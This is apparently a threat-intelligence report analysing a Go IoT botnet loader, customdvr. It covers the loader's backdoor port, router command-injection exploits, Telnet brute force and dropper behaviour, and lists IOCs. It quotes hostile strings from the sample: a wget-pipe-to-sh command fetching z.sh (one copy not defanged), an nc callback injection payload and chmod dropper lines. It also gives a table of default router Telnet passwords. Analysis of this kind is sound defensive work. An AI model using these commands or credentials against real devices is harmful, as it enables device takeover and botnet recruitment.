---
title: "Malware Sample Analysis: customdvr (ELF · elf · d383a8b7)"
published: 2026-11-25
draft: false
description: "Malicious (medium confidence): customdvr · botnet/dropper/loader · difficulty medium · static decompilation (dynamic execution yielded no runtime behavior)"
tags: ["customdvr", "botnet", "dropper", "loader", "ELF"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-25-customdvr-d383a8b7"
---

> [!WARNING]
> **Verdict: malicious** · Family **customdvr** (suspected) · Confidence **medium**
> 
> Aliases: Go-Mirai derivative, EchoDropper IoT loader
> 
> Static disassembly and function-level cross-references directly recover a decidable malicious main flow: on startup the program calls net.Listen("tcp","0.0.0[.]0:19412") to open a callback backdoor port, uses bufio.Scanner to read target lines from stdin and spawns goroutines calling main.httpBannerCheck for scanning; main.scannerInitExploits builds a mapping from HTTP banners to 39 infect*/exploit* functions; it embeds many admin/root/guest weak passwords for Telnet login, and after a successful login writes a drop script to /tmp in chunks via echoDropper and chmods and executes it; it hardcodes pulling run.sh/z.sh stage-2 scripts from 45.198.224[.]75; it also contains a reverse-shell collection server and infection/credential reporting paths. The sample contains the full chain of scanning, exploitation, Telnet brute force, payload dropping and backdoor listening, consistent with IoT botnet loader characteristics.

## Overview

| Item | Content |
|:--|:--|
| Family | **customdvr** · Aliases Go-Mirai derivative, EchoDropper IoT loader · _suspected_ |
| Confidence | **Medium** |
| Behavior class | botnet · dropper · loader |
| Difficulty | medium |
| First seen | 2026-11-24 12:34:46 |
| Analysis method | Static decompilation (dynamic execution yielded no runtime behavior) |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/d383a8b7eca7929a7ce791480753bdf6cbb5180f17934aae055a3ba5652b6a51/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Backdoor listener on 19412</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1571</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Read scan targets from stdin</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1046</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Select exploit by banner</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1046</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Multi-brand router cmd injection</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1190</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Telnet password brute force</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1110.001</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample identification

| Item | Value |
|:--|:--|
| SHA-256 | `d383a8b7eca7929a7ce791480753bdf6cbb5180f17934aae055a3ba5652b6a51` |
| MD5 | _not recorded_ |
| Size | 6,029,496 bytes (5.8 MB) |
| Type | ELF · `elf` |

## Behavior analysis

**10** behaviors in total, each with attached evidence, all obtainable statically.

### 1. Backdoor listener on 19412

`T1571` · Confidence **high** · Static

After starting, the program calls net.Listen("tcp","0.0.0[.]0:19412") to open a 19412/TCP listener on the local host, serving as the callback/command channel for infected devices or the controller.

> **Evidence**: main.main rva 0x2618d8 fetches "tcp"(rva 0x347395) and "0.0.0[.]0:19412"(VA 0x34a560), rva 0x2618f0 call net.Listen; the failure branch returns at rva 0x261af4
> 
> **Source**: `ref:3b8813f6ac` · `ref:4aaf62d071`

### 2. Read scan targets from stdin

`T1046` · Confidence **high** · Static

The main loop uses bufio.Scanner to read targets line by line from stdin; lines of length 6 whose content is "listen" and all other lines both spawn goroutines calling main.httpBannerCheck, i.e. the operator/upper layer feeds an IP list to drive scanning.

> **Evidence**: main.main rva 0x261b04 call bufio.(*Scanner).Scan; rva 0x261b24-0x261b68 compares l/i/s/t/e/n byte by byte; the goroutine wrappers at rva 0x261d10 and 0x261cb0 both call main.httpBannerCheck (rva 0x261030)
> 
> **Source**: `ref:3b8813f6ac` · `ref:4aaf62d071`

### 3. Select exploit by banner

`T1046` · Confidence **high** · Static

The scanner uses HTTP Server headers/page characteristics (Basic realm="DVR", uc-httpd 1.0.0, CMS Web Viewer, Server: GoAhead-Webs, Server: Boa/0.93.15, micro_httpd, /playzone, etc.) to build a mapping table from banners to specific exploit functions, then launches the corresponding exploit against matching devices.

> **Evidence**: main.scannerInitExploits rva 0x25e7b0 repeatedly calls runtime.mapassign_faststr; key strings VA 0x34ad03(uc-httpd 1.0.0), 0x34ad11(CMS Web Viewer), 0x34d8f6(Server: GoAhead-Webs), 0x34d052(Server: Boa/0.93.15), 0x350c20(Basic realm="Server Status"), 0x349dd7(/playzone)
> 
> **Source**: `ref:4aaf62d071` · `ref:6079c43ead`

### 4. Multi-brand router command injection

`T1190` · Confidence **high** · Static

It builds command-injection requests against various web interfaces such as Boa, GoAhead, DVR, ASUS RT, GoCloud and GPON (e.g. /boafrm/formSysCmd, app_ping diag, /apply.cgi, /saveSystemConfig), executing busybox telnetd or wget download commands on the target.

> **Evidence**: main.ZTEexploitDevice rva 0x2510a0, main.infectFunctionDvrip rva 0x245b90, main.BoasysCmdInjection rva 0x24c130 and other infect*/exploit* functions, 39 in total; injection payload string VA 0x352634 contains /cgi-bin/webui/admin/tools/app_ping/...nc 45.198.224[.]75 8999
> 
> **Source**: `ref:4aaf62d071` · `ref:482c3aae32`

### 5. Telnet weak-password brute force

`T1110.001` · Confidence **high** · Static

It embeds many admin/root/guest and vendor default passwords, attempts Telnet logins on ports such as 23/2323/9527/4567/5188/9001; after success it reads the busybox version, determines writable directories and loads the echo dropper.

> **Evidence**: main.zteBrute rva 0x250660, main.telnetLoader rva 0x2436b0 call net.DialTimeout; password strings admin:admin/root:xc3511/admin:CUadmin at VA 0x348xxx; log "Telnet: %s:%s shell found on device" VA 0x3518xx
> 
> **Source**: `ref:4aaf62d071` · `ref:482c3aae32`

### 6. Deliver the echo dropper

`T1105` · Confidence **high** · Static

Through the Telnet/busybox shell it writes the drop script to /tmp in echo chunks (/tmp/vc, r.sh), chmods 755/777 and executes it, and selects the matching payload to download according to the device architecture (mips/arm7, etc.).

> **Evidence**: strings "chmod${IFS}777${IFS}/tmp/vc" VA 0x350b99, "/tmp/vc" VA 0x347e46, "-o r.sh) && chmod 755 r.sh && ./r.sh"; type *main.echoDropper @0x2bba22; log "Loader: Loaded %d echo droppers" VA 0x351a6a
> 
> **Source**: `ref:4aaf62d071` · `ref:025d652eb7`

### 7. Download and execute stage-2 scripts

`T1059.004` · Confidence **high** · Static

It uses wget/tftp to pull run.sh or z.sh from 45.198.224[.]75 and executes them with sh; the HTTP request strings are hxxp://45.198.224[.]75/run.sh and wget hxxp://45.198.224[.]75/z.sh -O - | sh.

> **Evidence**: VA 0x350bb4 "hxxp://45.198.224[.]75/run.sh" (referenced at main.init rva 0x23ef30); VA 0x35e230 "wget%20http%3A%2F%2F45.198.224.75%2Fz.sh%20-O%20-%20%7C%20sh%20%23"
> 
> **Source**: `ref:4aaf62d071`

### 8. Start reverse-shell collector

`T1095` · Confidence **high** · Static

main.goCloudreverseServer calls net.Listen on a specified port of 0.0.0[.]0, receives shells that call back after GoCloud-class devices are exploited, and prints "GoCloud: %s received connection".

> **Evidence**: main.goCloudreverseServer rva 0x252420: addi r4,-0x7c32 fetches "0.0.0[.]0", runtime.concatstring2 concatenates the port then call net.Listen; log string VA 0x36040d
> 
> **Source**: `ref:4aaf62d071`

### 9. Report bots and leaked credentials

`T1041` · Confidence **medium** · Static

It embeds panel paths such as report_bots and /linuxshell, and outputs leaked-credential logs during exploitation, to summarize infected devices and credentials to the control panel.

> **Evidence**: strings "report_bots/linuxshell" VA 0x349d5f; "leaked credentials" VA 0x34e25x; main.leakCred rva 0x24e5c0, main.checkCredLeak rva 0x24e780, main.logDevice rva 0x241a20
> 
> **Source**: `ref:4aaf62d071` · `ref:482c3aae32`

### 10. Detect and evade honeypots

`T1497.001` · Confidence **medium** · Static

Before exploitation it calls main.detectHoneypot to check whether the target is a honeypot/fake service, and skips that target once matched to reduce capture risk.

> **Evidence**: main.detectHoneypot rva 0x260f20; log "detected honeypot"
> 
> **Source**: `ref:4aaf62d071`


## IOC (defanged)

### Network

:::caution
**Pending dynamic verification**: the above addresses come from static analysis; no successful connection or session was observed under the analysis environment's network isolation, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://45[.]198[.]224[.]75/run.sh` | 80 | download | Static | ⏳ Not observed |
| http | `hxxp://45[.]198[.]224[.]75/z.sh` | 80 | download | Static | ⏳ Not observed |

### Host

**Drop paths**

- `/tmp/vc`
- `/tmp/r.sh`
- `/var/tmp/`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `45.198.224[.]75` | Yes | Static |
| `dropper_urls` | `hxxp://45[.]198[.]224[.]75/run.sh; hxxp://45[.]198[.]224[.]75/z.sh` | Yes | Static |
| `listener` | `tcp 0.0.0[.]0:19412` | Yes | Static |
| `panel_paths` | `report_bots, /linuxshell` | No | Static |
| `telnet_ports` | `23, 2323, 9527, 4567, 5188, 9001` | No | Static |
| `telnet_credentials` | `admin:admin, admin:123456, root:xc3511, root:hi3518, root:klv123, admin:CUadmin, adminpldt:z6dUABtl270qRxt7a2uGTiw, telecomadmin:G3p0n#n3t etc.` | No | Static |
| `encryption_algo` | `No self-implemented encryption observed; C2/dropping uses plaintext HTTP/Telnet (AES/SHA/MD5 constants come from the Go standard library and TLS dependencies)` | No | Static |

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; please note when citing this report.

- Do not judge it as using encrypted communication or having ransomware encryption capability merely because AES S-box, MD5 and SHA-256 constants appear in the sample: these constants come from the Go standard library and TLS dependencies; the actual C2/dropping channel is plaintext HTTP/Telnet.
- Do not treat dvr[.]shinsoft[.]com.tw or 212.75.138[.]206:8080 as this sample's C2: the former appears in an SMTP/FTP configuration injection payload against third-party DVRs, the latter in an ASUS router firewall redirect exploit payload; both are parameters on the attack-target side.
- Do not classify it as DDoS/ransomware: there is no flood/attack module in the function table, nor file encryption or ransom-note logic; the core capabilities are scanning, exploitation, Telnet brute force, payload dropping and backdoor listening.
- Do not claim C2 communication or outbound connections were observed without a real session: this run's environment had no network, and the ppc64 sample exited at the Go runtime initialization stage, producing no network behavior.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Static decompilation (dynamic execution yielded no runtime behavior) |
| Unpacking | No |

**Limitations and pending verification**

1. Dynamic channel: cross-architecture emulation reported "failed to reserve page summary memory" at the Go runtime initialization stage and exited (exit=2); no network, file or process behavior was observed, reproduced=false.
2. Static analysis cannot recover the remote control-panel address or SSKEY authentication value; only the drop host 45.198.224[.]75 and wget/tftp download paths are confirmed; related C2 fields are marked static with pending_dynamic_verify=true.
3. Go strings are stored as concatenated blobs; some string boundaries and call relationships were inferred from disassembly constant cross-references, without complete source-level recovery.
4. The run.sh/z.sh stage-2 scripts were not obtained; the architecture, persistence method and DDoS capability of their final malicious payload are unknown.
5. The sample is a PPC64 big-endian build, possibly targeting only specific embedded device/router firmware; other architecture variants were not included in this analysis.

## Evidence index

<details>
<summary>Expand 8 tool evidence items</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ref:6079c43ead` | ELF structure parsing | ELF64 PPC64 big-endian EXEC, .gopclntab/.go.buildinfo present, no PT_INTERP, no dependencies, 6,029,496 bytes |
| `ref:caa9cd9e79` | Hash and fingerprint | sha256=d383a8b7...b6a51; md5=553204233756d8633b61bde9c1694043 |
| `ref:482c3aae32` | String extraction | ASCII 28,134 items / UTF-16 86 items; confirms Telnet/loader/exploit related strings and credential table |
| `ref:025d652eb7` | String extraction | long-string view confirms the *map[string]main.echoDropper type exists |
| `ref:6afaa7c10c` | Cryptographic constant identification | AES S-box/inverse S-box, SHA-256 K, MD5 init, standard and URL-safe base64 (Go standard library/dependency constants) |
| `ref:3b8813f6ac` | disasm.function | main.main disassembly: net.Listen("tcp","0.0.0[.]0:19412"), stdin scan loop and goroutine scheduling |
| `ref:c1f0e03653` | emu.qemu | cross-architecture execution exit=2, "failed to reserve page summary memory" at Go runtime init, no observable behavior |
| `ev-000018` | evidence.record | self-written script parses pclntab, recovers 6137 functions and disassembles key functions, rebuilds IOC/string cross-references (self_reported) |

</details>

---

_The sample in this report is not public; IOCs are defanged; for security research only._
